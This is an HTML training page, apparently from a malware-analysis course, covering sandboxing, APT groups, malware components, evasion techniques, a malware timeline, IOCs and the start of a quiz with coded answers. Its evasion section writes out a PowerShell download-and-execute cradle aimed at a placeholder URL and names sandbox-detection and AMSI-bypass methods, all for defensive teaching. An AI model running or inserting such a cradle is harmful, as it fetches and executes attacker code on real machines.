          <div style="color: #00ff00;">‚ïë   HEXWORTH PRIME MALWARE ANALYSIS LABORATORY v3.2    ‚ïë</div>
          <div style="color: #00ff00;">‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù</div>
          <div style="margin-top: 15px; color: #ffff00;">Select a sample and analysis type to begin...</div>
        </div>
      </div>

      <div class="section" style="margin-top: 30px;">
        <h3>Sandboxing Best Practices</h3>
        <div class="warning-box">
          <h4>Isolation Requirements:</h4>
          <ul>
            <li>Use dedicated hardware or virtualization (VMware, VirtualBox, Hyper-V)</li>
            <li>Disable shared folders and clipboard between host and VM</li>
            <li>Use isolated network (air-gapped or controlled virtual network)</li>
            <li>Take snapshots before analysis for easy restoration</li>
            <li>Monitor for VM escape attempts and sandbox detection</li>
            <li>Use different analysis environments to detect environment-specific behavior</li>
          </ul>
        </div>

        <h3>Behavioral Indicators to Monitor</h3>
        <div class="ioc-grid">
          <div class="ioc-card">
            <h4>Process Activity</h4>
            <ul>
              <li>Process creation/termination</li>
              <li>Process injection techniques</li>
              <li>Parent-child relationships</li>
              <li>Unusual system processes</li>
            </ul>
          </div>
          <div class="ioc-card">
            <h4>File System</h4>
            <ul>
              <li>File creation/modification/deletion</li>
              <li>Dropped executables</li>
              <li>Temporary file usage</li>
              <li>Encryption activities</li>
            </ul>
          </div>
          <div class="ioc-card">
            <h4>Registry</h4>
            <ul>
              <li>Autorun key modifications</li>
              <li>Service creation</li>
              <li>Configuration changes</li>
              <li>Security policy modifications</li>
            </ul>
          </div>
          <div class="ioc-card">
            <h4>Network</h4>
            <ul>
              <li>C2 communications</li>
              <li>Data exfiltration</li>
              <li>DNS requests</li>
              <li>Port scanning activities</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <!-- APT Tab -->
    <div class="tab-content" id="apt">
      <div class="section">
        <h2>üéØ Advanced Persistent Threats (APT)</h2>

        <div class="danger-box">
          <h3>APT Characteristics</h3>
          <p>Advanced Persistent Threats are prolonged and targeted cyberattacks where attackers gain access to a network and remain undetected for extended periods. Typically nation-state sponsored or highly organized criminal groups.</p>
        </div>

        <h3>APT Defining Attributes</h3>
        <div class="malware-grid">
          <div class="malware-card">
            <h4>Advanced</h4>
            <p class="description">Sophisticated techniques including zero-day exploits, custom malware, social engineering, and multi-stage attacks.</p>
          </div>
          <div class="malware-card">
            <h4>Persistent</h4>
            <p class="description">Long-term presence with multiple backdoors, re-infection mechanisms, and continuous monitoring capabilities.</p>
          </div>
          <div class="malware-card">
            <h4>Threat</h4>
            <p class="description">Specific objectives: espionage, intellectual property theft, infrastructure disruption, or strategic advantage.</p>
          </div>
          <div class="malware-card">
            <h4>Organized</h4>
            <p class="description">Well-funded teams with specialized roles, operational security, and coordinated campaigns.</p>
          </div>
        </div>

        <h3>APT Attack Lifecycle (Kill Chain)</h3>
        <ol>
          <li><strong>Reconnaissance:</strong> Information gathering about targets, infrastructure, personnel</li>
          <li><strong>Initial Compromise:</strong> Spear-phishing, watering hole attacks, supply chain infiltration</li>
          <li><strong>Establish Foothold:</strong> Deploy backdoors, create persistence mechanisms</li>
          <li><strong>Escalate Privileges:</strong> Exploit vulnerabilities to gain administrative access</li>
          <li><strong>Internal Reconnaissance:</strong> Map network, identify valuable targets</li>
          <li><strong>Lateral Movement:</strong> Spread to other systems using compromised credentials</li>
          <li><strong>Maintain Presence:</strong> Install additional backdoors, update malware</li>
          <li><strong>Complete Mission:</strong> Data exfiltration, destruction, or long-term monitoring</li>
        </ol>

        <h3>Notable APT Groups</h3>
        <div class="malware-grid">
          <div class="malware-card">
            <h4>APT28 (Fancy Bear) <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Russian military intelligence (GRU). Targets governments, military, security organizations. Known for DNC breach.</p>
            <div class="behaviors">
              <span class="behavior-tag">Spear-phishing</span>
              <span class="behavior-tag">Zero-days</span>
              <span class="behavior-tag">X-Agent</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>APT29 (Cozy Bear) <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Russian Foreign Intelligence (SVR). SolarWinds supply chain attack. Sophisticated stealth operations.</p>
            <div class="behaviors">
              <span class="behavior-tag">Supply Chain</span>
              <span class="behavior-tag">Stealth</span>
              <span class="behavior-tag">Cloud Focus</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Lazarus Group <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">North Korean state-sponsored. WannaCry, Sony Pictures hack, SWIFT attacks. Financial motivation and disruption.</p>
            <div class="behaviors">
              <span class="behavior-tag">Ransomware</span>
              <span class="behavior-tag">Financial Theft</span>
              <span class="behavior-tag">Destructive</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>APT41 (Double Dragon) <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">Chinese state-sponsored with criminal operations. Dual espionage and financial gain. Healthcare, telecom, gaming targets.</p>
            <div class="behaviors">
              <span class="behavior-tag">Espionage</span>
              <span class="behavior-tag">Financial Crime</span>
              <span class="behavior-tag">Supply Chain</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>APT1 (Comment Crew) <span class="threat-level threat-high">High</span></h4>
            <p class="description">Chinese PLA Unit 61398. First publicly attributed APT group. Massive intellectual property theft campaign.</p>
            <div class="behaviors">
              <span class="behavior-tag">IP Theft</span>
              <span class="behavior-tag">Long-term Access</span>
              <span class="behavior-tag">Custom Malware</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Equation Group <span class="threat-level threat-critical">Critical</span></h4>
            <p class="description">NSA-linked. Most sophisticated APT group. EternalBlue exploit, firmware implants, decades of operations.</p>
            <div class="behaviors">
              <span class="behavior-tag">Zero-days</span>
              <span class="behavior-tag">Firmware</span>
              <span class="behavior-tag">UEFI Rootkits</span>
            </div>
          </div>
        </div>

        <h3>APT Defense Strategies</h3>
        <div class="info-box">
          <ul>
            <li><strong>Threat Intelligence:</strong> Subscribe to APT indicators, MITRE ATT&CK framework mapping</li>
            <li><strong>Network Segmentation:</strong> Limit lateral movement with proper network zoning</li>
            <li><strong>Endpoint Detection & Response (EDR):</strong> Advanced behavioral monitoring</li>
            <li><strong>Zero Trust Architecture:</strong> Verify every access request, never assume trust</li>
            <li><strong>Privileged Access Management:</strong> Strict control over administrative credentials</li>
            <li><strong>Security Information & Event Management (SIEM):</strong> Centralized log analysis</li>
            <li><strong>Regular Threat Hunting:</strong> Proactive search for IOCs and anomalous behavior</li>
            <li><strong>Incident Response Planning:</strong> Prepared playbooks for APT scenarios</li>
          </ul>
        </div>

        <div class="warning-box">
          <h4>APT Attribution Challenges</h4>
          <p>Attributing attacks to specific APT groups is complex due to:</p>
          <ul>
            <li>False flag operations and tool sharing between groups</li>
            <li>Use of compromised infrastructure obscuring true origin</li>
            <li>Political motivations affecting public attribution</li>
            <li>Sophisticated operational security by threat actors</li>
          </ul>
        </div>
      </div>
    </div>

    <!-- Components Tab -->
    <div class="tab-content" id="components">
      <div class="section">
        <h2>‚öôÔ∏è Malware Components & Architecture</h2>
        <p>Modern malware operates using modular components that work together to achieve objectives while evading detection.</p>

        <div class="malware-grid">
          <div class="malware-card">
            <h4>Dropper</h4>
            <p class="description">Initial delivery mechanism that installs the main malware payload. Often disguised as legitimate software or documents.</p>
            <div class="behaviors">
              <span class="behavior-tag">Payload Delivery</span>
              <span class="behavior-tag">Evasion</span>
              <span class="behavior-tag">Self-Delete</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Downloader</h4>
            <p class="description">Downloads additional malware components from remote servers. Allows attackers to deploy stage-2+ payloads after initial compromise.</p>
            <div class="behaviors">
              <span class="behavior-tag">Remote Fetch</span>
              <span class="behavior-tag">Multi-stage</span>
              <span class="behavior-tag">Small Footprint</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Loader</h4>
            <p class="description">Loads malicious code into memory without writing to disk. Critical for fileless malware operations.</p>
            <div class="behaviors">
              <span class="behavior-tag">Memory Injection</span>
              <span class="behavior-tag">Process Hollowing</span>
              <span class="behavior-tag">Reflective DLL</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Crypter</h4>
            <p class="description">Encrypts malware payload to evade signature-based detection. Decrypts at runtime for execution.</p>
            <div class="behaviors">
              <span class="behavior-tag">Encryption</span>
              <span class="behavior-tag">Runtime Decryption</span>
              <span class="behavior-tag">AV Evasion</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Packer</h4>
            <p class="description">Compresses and obfuscates executable code. Makes reverse engineering and static analysis more difficult.</p>
            <div class="behaviors">
              <span class="behavior-tag">Compression</span>
              <span class="behavior-tag">Obfuscation</span>
              <span class="behavior-tag">Anti-Debug</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Obfuscator</h4>
            <p class="description">Transforms code to hide its true purpose while maintaining functionality. Uses techniques like control flow flattening and string encryption.</p>
            <div class="behaviors">
              <span class="behavior-tag">Code Morphing</span>
              <span class="behavior-tag">String Hiding</span>
              <span class="behavior-tag">Anti-Analysis</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Exploit</h4>
            <p class="description">Code that takes advantage of vulnerabilities to gain unauthorized access or elevate privileges.</p>
            <div class="behaviors">
              <span class="behavior-tag">Vulnerability Abuse</span>
              <span class="behavior-tag">Privilege Escalation</span>
              <span class="behavior-tag">Code Execution</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Payload</h4>
            <p class="description">The actual malicious functionality - what the malware does after gaining access (ransomware encryption, data theft, etc.).</p>
            <div class="behaviors">
              <span class="behavior-tag">Core Functionality</span>
              <span class="behavior-tag">Objective Execution</span>
              <span class="behavior-tag">Modular</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Backdoor</h4>
            <p class="description">Provides persistent remote access to compromised systems, bypassing normal authentication mechanisms.</p>
            <div class="behaviors">
              <span class="behavior-tag">Remote Access</span>
              <span class="behavior-tag">Persistence</span>
              <span class="behavior-tag">C2 Communication</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>C2 (Command & Control)</h4>
            <p class="description">Communication infrastructure for attackers to send commands and receive data from compromised systems.</p>
            <div class="behaviors">
              <span class="behavior-tag">Bidirectional Comms</span>
              <span class="behavior-tag">Encrypted Channels</span>
              <span class="behavior-tag">Protocol Variety</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Rootkit</h4>
            <p class="description">Hides malware presence by intercepting system calls and modifying OS behavior. Can operate at kernel or user level.</p>
            <div class="behaviors">
              <span class="behavior-tag">Stealth</span>
              <span class="behavior-tag">Kernel Hooks</span>
              <span class="behavior-tag">Process Hiding</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Keylogger</h4>
            <p class="description">Records keystrokes to capture passwords, credit card numbers, and other sensitive typed information.</p>
            <div class="behaviors">
              <span class="behavior-tag">Keystroke Capture</span>
              <span class="behavior-tag">Form Grabbing</span>
              <span class="behavior-tag">Credential Theft</span>
            </div>
          </div>
        </div>

        <h3>Multi-Stage Attack Architecture</h3>
        <div class="info-box">
          <h4>Stage 1: Initial Access</h4>
          <ul>
            <li>Small dropper/downloader delivered via phishing email</li>
            <li>Minimal functionality to avoid detection</li>
            <li>Establishes connection to C2 server</li>
          </ul>

          <h4>Stage 2: Payload Deployment</h4>
          <ul>
            <li>Downloads main malware components</li>
            <li>Establishes persistence mechanisms</li>
            <li>Begins reconnaissance of local system</li>
          </ul>

          <h4>Stage 3: Privilege Escalation</h4>
          <ul>
            <li>Exploits vulnerabilities for higher access</li>
            <li>Credential dumping and lateral movement preparation</li>
            <li>Disables security software</li>
          </ul>

          <h4>Stage 4: Objective Execution</h4>
          <ul>
            <li>Deploy final payload (ransomware, data exfiltration tool, etc.)</li>
            <li>Execute primary attack objective</li>
            <li>Maintain access for future operations</li>
          </ul>
        </div>

        <h3>Common Obfuscation Techniques</h3>
        <table class="comparison-table">
          <thead>
            <tr>
              <th>Technique</th>
              <th>Description</th>
              <th>Detection Difficulty</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>String Encryption</strong></td>
              <td>Encrypts strings (URLs, commands) and decrypts at runtime</td>
              <td><span class="threat-level threat-medium">Medium</span></td>
            </tr>
            <tr>
              <td><strong>Control Flow Flattening</strong></td>
              <td>Transforms code into switch/case statements obscuring logic flow</td>
              <td><span class="threat-level threat-high">High</span></td>
            </tr>
            <tr>
              <td><strong>Dead Code Injection</strong></td>
              <td>Inserts non-functional code to confuse analysis</td>
              <td><span class="threat-level threat-low">Low</span></td>
            </tr>
            <tr>
              <td><strong>Code Virtualization</strong></td>
              <td>Converts code to custom bytecode executed by embedded VM</td>
              <td><span class="threat-level threat-critical">Critical</span></td>
            </tr>
            <tr>
              <td><strong>Polymorphism</strong></td>
              <td>Changes code signature while maintaining functionality</td>
              <td><span class="threat-level threat-high">High</span></td>
            </tr>
            <tr>
              <td><strong>Metamorphism</strong></td>
              <td>Completely rewrites code with each generation</td>
              <td><span class="threat-level threat-critical">Critical</span></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Evasion Tab -->
    <div class="tab-content" id="evasion">
      <div class="section">
        <h2>ü•∑ Detection Evasion Techniques</h2>

        <div class="danger-box">
          <strong>‚ö†Ô∏è Educational Purpose Only</strong>
          <p>Understanding evasion techniques is crucial for defenders to build effective detection mechanisms. This knowledge should only be used for defensive security purposes.</p>
        </div>

        <h3>Anti-Virus (AV) Evasion</h3>
        <div class="malware-grid">
          <div class="malware-card">
            <h4>Signature Evasion</h4>
            <p class="description">Modify code to avoid matching known malware signatures in AV databases.</p>
            <div class="behaviors">
              <span class="behavior-tag">Code Polymorphism</span>
              <span class="behavior-tag">Encryption</span>
              <span class="behavior-tag">Packing</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Behavioral Evasion</h4>
            <p class="description">Avoid triggering heuristic and behavioral detection by mimicking legitimate software patterns.</p>
            <div class="behaviors">
              <span class="behavior-tag">Low & Slow</span>
              <span class="behavior-tag">Legitimate APIs</span>
              <span class="behavior-tag">Time Delays</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Fileless Execution</h4>
            <p class="description">Run malicious code entirely in memory without writing files to disk.</p>
            <div class="behaviors">
              <span class="behavior-tag">PowerShell</span>
              <span class="behavior-tag">WMI</span>
              <span class="behavior-tag">Registry Storage</span>
            </div>
          </div>

          <div class="malware-card">
            <h4>Living-off-the-Land</h4>
            <p class="description">Use legitimate system tools and binaries for malicious purposes (LOLBins).</p>
            <div class="behaviors">
              <span class="behavior-tag">certutil.exe</span>
              <span class="behavior-tag">rundll32.exe</span>
              <span class="behavior-tag">mshta.exe</span>
            </div>
          </div>
        </div>

        <h3>Sandbox Detection & Evasion</h3>
        <div class="info-box">
          <h4>Environmental Checks:</h4>
          <ul>
            <li><strong>VM Detection:</strong> Check for VMware tools, VirtualBox drivers, hypervisor artifacts</li>
            <li><strong>System Resources:</strong> Verify RAM > 4GB, multiple CPU cores, realistic disk size</li>
            <li><strong>Running Processes:</strong> Detect analysis tools (Process Monitor, Wireshark, debuggers)</li>
            <li><strong>User Activity:</strong> Check for mouse movements, recent files, browsing history</li>
            <li><strong>Time-based Triggers:</strong> Delayed execution or specific date/time activation</li>
            <li><strong>Geographic Checks:</strong> Verify target location, language, timezone</li>
            <li><strong>Network Connectivity:</strong> Internet connection tests, DNS resolution checks</li>
          </ul>
        </div>

        <h3>Anti-Analysis Techniques</h3>
        <table class="comparison-table">
          <thead>
            <tr>
              <th>Technique</th>
              <th>Target</th>
              <th>Method</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Anti-Debugging</strong></td>
              <td>Debuggers</td>
              <td>IsDebuggerPresent(), timing checks, exception handling, debug registers</td>
            </tr>
            <tr>
              <td><strong>Anti-Disassembly</strong></td>
              <td>Reverse Engineering</td>
              <td>Junk code, fake conditional jumps, overlapping instructions</td>
            </tr>
            <tr>
              <td><strong>Code Obfuscation</strong></td>
              <td>Static Analysis</td>
              <td>Control flow flattening, string encryption, API hashing</td>
            </tr>
            <tr>
              <td><strong>Packing</strong></td>
              <td>Signature Detection</td>
              <td>UPX, Themida, VMProtect, custom packers</td>
            </tr>
            <tr>
              <td><strong>Process Injection</strong></td>
              <td>Process Monitoring</td>
              <td>DLL injection, process hollowing, APC injection, reflective DLL</td>
            </tr>
            <tr>
              <td><strong>Rootkit Techniques</strong></td>
              <td>System Visibility</td>
              <td>SSDT hooking, IRP hooking, DKOM (Direct Kernel Object Manipulation)</td>
            </tr>
          </tbody>
        </table>

        <h3>Network Evasion</h3>
        <div class="ioc-grid">
          <div class="ioc-card">
            <h4>Protocol Tunneling</h4>
            <p>Hide malicious traffic inside legitimate protocols (DNS, HTTPS, ICMP)</p>
          </div>
          <div class="ioc-card">
            <h4>Domain Generation Algorithms (DGA)</h4>
            <p>Generate thousands of domain names for C2, making blocklisting ineffective</p>
          </div>
          <div class="ioc-card">
            <h4>Fast Flux Networks</h4>
            <p>Rapidly change DNS records to hide C2 infrastructure</p>
          </div>
          <div class="ioc-card">
            <h4>Encrypted Communications</h4>
            <p>Use TLS/SSL encryption to hide C2 traffic from network inspection</p>
          </div>
          <div class="ioc-card">
            <h4>Steganography</h4>
            <p>Hide commands and data within images, videos, or other files</p>
          </div>
          <div class="ioc-card">
            <h4>Timing Randomization</h4>
            <p>Random delays between beacons to avoid pattern detection</p>
          </div>
        </div>

        <h3>PowerShell Attack Techniques</h3>
        <div class="warning-box">
          <h4>Common PowerShell Exploitation Methods:</h4>
          <ul>
            <li><strong>Download Cradles:</strong> <code>IEX (New-Object Net.WebClient).DownloadString('url')</code></li>
            <li><strong>Encoded Commands:</strong> Base64 encoding to bypass command-line logging</li>
            <li><strong>Reflective PE Injection:</strong> Load executables directly into memory</li>
            <li><strong>Empire/Metasploit Frameworks:</strong> Post-exploitation PowerShell frameworks</li>
            <li><strong>AMSI Bypass:</strong> Techniques to disable Anti-Malware Scan Interface</li>
            <li><strong>PowerView/BloodHound:</strong> Active Directory reconnaissance tools</li>
          </ul>
        </div>

        <h3>Defensive Countermeasures</h3>
        <div class="info-box">
          <h4>Detecting Evasion Attempts:</h4>
          <ul>
            <li><strong>Behavioral Analysis:</strong> Monitor for suspicious API call sequences</li>
            <li><strong>Memory Scanning:</strong> Inspect process memory for malicious code</li>
            <li><strong>PowerShell Logging:</strong> Enable script block and transcription logging</li>
            <li><strong>Constrained Language Mode:</strong> Restrict PowerShell capabilities</li>
            <li><strong>Application Whitelisting:</strong> Only allow approved executables</li>
            <li><strong>YARA Rules:</strong> Create signatures for evasion technique patterns</li>
            <li><strong>Honeypots:</strong> Deploy decoy systems to detect reconnaissance</li>
            <li><strong>Network Traffic Analysis:</strong> Baseline normal traffic, detect anomalies</li>
          </ul>
        </div>
      </div>
    </div>

    <!-- Timeline Tab -->
    <div class="tab-content" id="timeline">
      <div class="section">
        <h2>üìÖ Malware Evolution Timeline</h2>
        <p>A historical journey through significant malware incidents that shaped cybersecurity.</p>

        <div class="timeline">
          <div class="timeline-item">
            <div class="timeline-year">1971</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Creeper - First Computer Worm</h4>
              <p>Experimental self-replicating program on ARPANET displaying "I'M THE CREEPER : CATCH ME IF YOU CAN". Led to creation of Reaper, the first antivirus.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">1986</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Brain - First PC Virus</h4>
              <p>First boot sector virus for IBM PCs, created by Pakistani brothers. Infected floppy disks and displayed creators' contact information.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">1988</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Morris Worm</h4>
              <p>First major Internet worm affecting 10% of connected computers (~6,000). Creator Robert Morris became first person convicted under Computer Fraud and Abuse Act.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">1999</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Melissa Virus</h4>
              <p>Macro virus spread via email, mass-mailing itself to first 50 contacts. Caused $80 million in damages. One of first social engineering-based malware.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2000</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>ILOVEYOU Worm</h4>
              <p>Love letter-themed email worm infected 45 million users in one day. Caused $10 billion in damages, overwhelming email servers globally.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2003</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Blaster Worm</h4>
              <p>Exploited Windows DCOM RPC vulnerability. Self-propagating worm that targeted Microsoft's update servers. Infected 1.5+ million systems.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2007</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Zeus Banking Trojan</h4>
              <p>Sophisticated credential-stealing malware targeting banking information. Source code leak led to numerous variants. Estimated losses over $100 million.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2010</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Stuxnet</h4>
              <p>First publicly known cyber weapon. Nation-state worm targeting Iranian nuclear facilities. Used multiple zero-days and compromised digitally signed drivers.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2013</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>CryptoLocker Ransomware</h4>
              <p>First widespread ransomware using strong encryption. Demanded Bitcoin payments. Launched ransomware era causing billions in damages.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2014</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Sony Pictures Hack</h4>
              <p>Attributed to Lazarus Group (North Korea). Destructive attack wiping systems and leaking confidential data. First major destructive cyber attack on US company.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2016</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Mirai Botnet</h4>
              <p>IoT botnet infecting millions of devices with default credentials. Launched massive DDoS attacks taking down major Internet infrastructure.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2017</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>WannaCry Ransomware</h4>
              <p>Global ransomware outbreak using EternalBlue exploit. Infected 230,000+ computers across 150 countries. Caused billions in damages to healthcare, logistics, governments.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2017</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>NotPetya</h4>
              <p>Destructive wiper disguised as ransomware. Supply chain attack via Ukrainian accounting software. Caused $10+ billion in damages globally.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2020</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>SolarWinds Supply Chain Attack</h4>
              <p>APT29 compromised SolarWinds Orion update mechanism, affecting 18,000+ organizations including US government agencies. Most sophisticated supply chain attack discovered.</p>
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-year">2021</div>
            <div class="timeline-marker"></div>
            <div class="timeline-content">
              <h4>Colonial Pipeline Ransomware</h4>
              <p>DarkSide ransomware group attacked US fuel pipeline, causing shutdown and fuel shortages. Led to increased focus on critical infrastructure security.</p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- IOC Tab -->
    <div class="tab-content" id="ioc">
      <div class="section">
        <h2>üîç Indicators of Compromise (IOCs)</h2>
        <p>IOCs are forensic artifacts that suggest a system has been compromised. Understanding and collecting IOCs is essential for threat detection and incident response.</p>

        <h3>IOC Categories</h3>
        <div class="ioc-grid">
          <div class="ioc-card">
            <h4>Network Indicators</h4>
            <ul>
              <li><strong>IP Addresses:</strong> C2 server IPs, malicious hosts</li>
              <li><strong>Domains:</strong> C2 domains, DGA domains</li>
              <li><strong>URLs:</strong> Malware download links, phishing pages</li>
              <li><strong>Email Addresses:</strong> Phishing senders, C2 addresses</li>
              <li><strong>Protocols:</strong> Unusual ports, protocol anomalies</li>
            </ul>
          </div>

          <div class="ioc-card">
            <h4>Host-Based Indicators</h4>
            <ul>
              <li><strong>File Hashes:</strong> MD5, SHA1, SHA256 of malware</li>
              <li><strong>File Paths:</strong> Locations of malicious files</li>
              <li><strong>File Names:</strong> Dropped file names</li>
              <li><strong>Registry Keys:</strong> Persistence mechanisms</li>
              <li><strong>Mutex Names:</strong> Unique malware identifiers</li>
            </ul>
          </div>

          <div class="ioc-card">
            <h4>Behavioral Indicators</h4>
            <ul>
              <li><strong>Process Names:</strong> Malicious processes</li>
              <li><strong>Services:</strong> Installed malicious services</li>
              <li><strong>Scheduled Tasks:</strong> Persistence tasks</li>
              <li><strong>DLL Loads:</strong> Injected libraries</li>
              <li><strong>API Calls:</strong> Suspicious API sequences</li>
            </ul>
          </div>

          <div class="ioc-card">
            <h4>Artifacts</h4>
            <ul>
              <li><strong>Log Entries:</strong> Suspicious event logs</li>
              <li><strong>User Agents:</strong> Malware HTTP user agents</li>
              <li><strong>Certificates:</strong> Malicious code signing certs</li>
              <li><strong>PDB Paths:</strong> Debug symbols from malware</li>
              <li><strong>Strings:</strong> Unique malware strings</li>
            </ul>
          </div>
        </div>

        <h3>Example IOC Collection - Emotet</h3>
        <div class="info-box">
          <h4>Network IOCs:</h4>
          <code>185.184.25.78:443</code> (C2 Server)<br>
          <code>190.90.233.66:80</code> (C2 Server)<br>
          <code>hxxp://malicious-domain[.]com/invoice.doc</code> (Phishing URL)<br><br>

          <h4>File IOCs:</h4>
          <code>SHA256: 3a5c9b8f7e2d1a0b9c8e7f6d5a4b3c2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c</code><br>
          <code>File: %AppData%\Local\Microsoft\Windows\INetCache\invoice.exe</code><br><br>

          <h4>Registry IOCs:</h4>
          <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate</code><br><br>

          <h4>Behavioral IOCs:</h4>
          <code>Process: powershell.exe -encodedCommand [base64]</code><br>
          <code>Network: Beaconing every 60 seconds to C2</code>
        </div>

        <h3>IOC Sharing Formats</h3>
        <table class="comparison-table">
          <thead>
            <tr>
              <th>Format</th>
              <th>Description</th>
              <th>Use Case</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>STIX/TAXII</strong></td>
              <td>Structured Threat Information eXpression / Trusted Automated eXchange</td>
              <td>Enterprise threat intelligence sharing</td>
            </tr>
            <tr>
              <td><strong>OpenIOC</strong></td>
              <td>Open framework for sharing IOCs in XML format</td>
              <td>Incident response, forensic investigations</td>
            </tr>
            <tr>
              <td><strong>YARA</strong></td>
              <td>Pattern matching rules for malware identification</td>
              <td>Malware detection and classification</td>
            </tr>
            <tr>
              <td><strong>CSV/JSON</strong></td>
              <td>Simple structured data formats</td>
              <td>Custom tooling, SIEM ingestion</td>
            </tr>
            <tr>
              <td><strong>MISP</strong></td>
              <td>Malware Information Sharing Platform</td>
              <td>Collaborative threat intelligence platform</td>
            </tr>
          </tbody>
        </table>

        <h3>IOC Lifecycle Management</h3>
        <ol>
          <li><strong>Collection:</strong> Gather IOCs from malware analysis, threat intelligence feeds, incident response</li>
          <li><strong>Validation:</strong> Verify accuracy and reduce false positives</li>
          <li><strong>Enrichment:</strong> Add context (threat actor, campaign, TTPs)</li>
          <li><strong>Distribution:</strong> Share via SIEM, IDS/IPS, firewalls, EDR platforms</li>
          <li><strong>Monitoring:</strong> Continuous scanning for IOC matches</li>
          <li><strong>Aging:</strong> Retire outdated IOCs to prevent alert fatigue</li>
          <li><strong>Feedback Loop:</strong> Update based on detections and new intelligence</li>
        </ol>

        <div class="warning-box">
          <h4>IOC Limitations</h4>
          <ul>
            <li><strong>Easy to Change:</strong> Attackers can modify infrastructure quickly</li>
            <li><strong>False Positives:</strong> Legitimate traffic may match IOCs</li>
            <li><strong>Point-in-Time:</strong> IOCs represent past compromise, not current threats</li>
            <li><strong>Context Required:</strong> IOCs alone don't explain attack methodology</li>
          </ul>
          <p><strong>Solution:</strong> Combine IOCs with behavioral analytics and TTPs (Tactics, Techniques, Procedures) using frameworks like MITRE ATT&CK.</p>
        </div>
      </div>
    </div>

    <!-- Quiz Tab -->
    <div class="tab-content" id="quiz">
      <div class="section">
        <h2>üéì Comprehensive Malware Analysis Quiz</h2>
        <p>Test your knowledge with 15 challenging questions covering all aspects of malware analysis.</p>

        <div class="quiz-container" id="quiz-container">
          <!-- Quiz questions will be inserted here -->
        </div>

        <div class="quiz-nav">
          <button class="btn btn-secondary" id="prev-question">‚Üê Previous</button>
          <button class="btn btn-primary" id="next-question">Next ‚Üí</button>
          <button class="btn btn-primary" id="submit-quiz" style="display: none;">Submit Quiz</button>
        </div>

        <div id="quiz-result" style="display: none;"></div>
      </div>
    </div>
  </div>

  <script>
    // State Management
    const state = {
      currentTab: 'overview',
      visitedTabs: new Set(['overview']),
      currentQuestion: 0,
      answers: {},
      quizSubmitted: false,
      selectedSample: null
    };

    // Quiz Questions
    const quizQuestions = [
      {
        question: "What is the primary difference between a virus and a worm?",
        options: [
          "Viruses are more dangerous than worms",
          "Worms self-propagate without user interaction, viruses require user action",
          "Viruses only infect Windows, worms are cross-platform",
          "Worms encrypt files, viruses steal data"
        ],
        correct: 1
      },
      {
